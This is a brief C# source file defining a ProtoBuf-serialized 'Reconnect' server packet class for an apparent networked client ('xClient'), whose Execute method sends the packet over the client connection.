using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Reconnect : IPacket
    {
        public Reconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}